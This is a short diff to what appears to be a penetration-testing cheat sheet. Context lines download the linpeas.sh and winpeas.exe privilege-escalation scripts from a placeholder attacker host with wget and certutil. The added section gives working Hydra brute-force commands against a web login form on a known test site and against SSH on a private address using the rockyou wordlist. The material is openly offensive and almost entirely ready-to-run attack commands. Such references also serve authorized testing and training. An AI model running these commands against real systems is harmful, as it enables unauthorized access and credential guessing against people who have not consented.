@@ -277,5 +277,12 @@ wget http://0.0.0.0:8080/linpeas.sh
 certutil.exe -urlcache -f http://0.0.0.0:8080/winpeas.exe
 
 ```
-
-
+# Brute-Force Attack
+**Use Hydra to Brute-Force Login page**
+```
+ hydra -l admin -P passlist.txt www.testphp.vulnweb.com http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V
+```
+**Use Hydra to Brute-Force SSH service**
+```
+hydra -L users.txt -P /usr/share/wordlists/rockyou.txt 10.0.0.0 ssh
+```
